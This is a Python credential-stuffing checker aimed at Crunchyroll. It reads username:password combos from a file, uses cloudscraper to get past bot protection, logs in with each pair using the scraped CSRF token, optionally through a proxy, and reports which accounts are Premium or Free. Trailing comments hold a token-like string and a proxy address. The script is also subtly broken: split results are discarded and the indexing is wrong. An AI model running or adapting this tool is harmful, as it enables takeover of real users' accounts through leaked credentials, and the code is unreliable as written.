import cloudscraper
from bs4 import BeautifulSoup as soup

combolist = open("combos2.txt", "r").readlines()
def main(combolist: list, proxy: list):
    i = 0
    x = 1
    if proxy == None:
        pass
    try:
        for combo in combolist:
            combo = combo.strip()
            print(f"{len(combolist)}")
            combo.split(":")
            print(combo.split(":"))
            session = cloudscraper.create_scraper()
            login_page = session.get("https://www.crunchyroll.com/login", proxies={"http": proxy, "https": proxy})
            login_soup = soup(login_page.content, "html5lib")
            csrftok = login_soup.find("input", id="login_form__token")["value"]
            p = session.post('https://www.crunchyroll.com/login', data={
                'login_form[name]' : combo[0],
                'login_form[password]' : combo[1],
                'login_form[redirect_url]': '/de',
                'login_form[_token]': csrftok
            }, proxies={"http": proxy, "https": proxy})
            membership = session.get('https://www.crunchyroll.com/de/acct/membership')
            member_soup = soup(membership.text, "html5lib")
            print(member_soup.title.text)
            try:
                if member_soup.title.get_text() == 'Crunchyroll -   Account Management\n':
                    if member_soup.find('td').get_text() == 'Premium':
                        print(f"{combo[i]}:{combo[x]} | Premium Membership")
                        i += 1
                        x += 1
                    else:
                        print(f"{combo[i]}:{combo[x]} | Free Membership")
                        i += 1
                        x += 1
                else:
                    print(f"[ERROR] Combo False: {combo[i]}:{combo[x]}")
                    i += 1
                    x += 1
            except Exception as e:
                print(f"[Proxy Dead or Banned]: {proxy} | {e}")
    except Exception as e:
        print(f"[ERROR]: {e}")

if __name__ == "__main__":
    main(combolist, None)        

# G0baxPoCtG9oFCQMbhy4H5nk6kXE5Ca4qK4kseejVwg
#	161.35.70.249:3128